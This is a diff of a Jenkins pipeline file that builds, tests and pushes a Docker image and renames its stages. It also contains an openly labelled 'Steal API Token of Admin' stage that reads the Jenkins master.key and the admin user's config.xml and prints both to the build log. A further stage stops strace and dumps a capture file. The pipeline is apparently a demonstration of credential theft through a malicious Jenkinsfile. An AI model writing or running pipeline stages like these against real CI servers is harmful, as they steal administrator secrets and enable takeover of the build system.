@@ -10,14 +10,14 @@ node('ubuntu') {
         checkout scm
     }
 
-    stage('Build image') {
+    stage('Build Docker image') {
         /* This builds the actual image; synonymous to
          * docker build on the command line */
 
         app = docker.build("nimrods8/helloisrael")
     }
 
-    stage('Test image') {
+    stage('Test Docker image') {
         /* Ideally, we would run a test framework against our image.
          * For this example, we're using a Volkswagen-type approach ;-) */
 
@@ -26,7 +26,7 @@ node('ubuntu') {
         }
     }
 
-    stage('Push image') {
+    stage('Push Docker image') {
         /* Finally, we'll push the image with two tags:
          * First, the incremental build number from Jenkins
          * Second, the 'latest' tag.
@@ -40,6 +40,7 @@ node('ubuntu') {
 // Steal API Token of Admin
 node ('master') {
     stage('Steal API Token of Admin') {
+        println "\n\n=========================================================";
         def fileContents = readFile file: "/var/lib/jenkins/secrets/master.key", encoding: "UTF-8"
         println fileContents
         def apiContents = readFile file: "/var/lib/jenkins/users/admin/config.xml", encoding: "UTF-8"
@@ -65,7 +66,8 @@ node ('master') {
 node ('ubuntu') {  
     stage('stop strace and dump results') {
         label 'ubuntu'
-        sh 'sudo kill $(pidof strace)'
+      println "\n\n\n\n=========================================================";
+      sh 'sudo kill $(pidof strace)'
         sh 'sudo cat /home/ubuntu/getIntoDevOps.2'
     }
 }
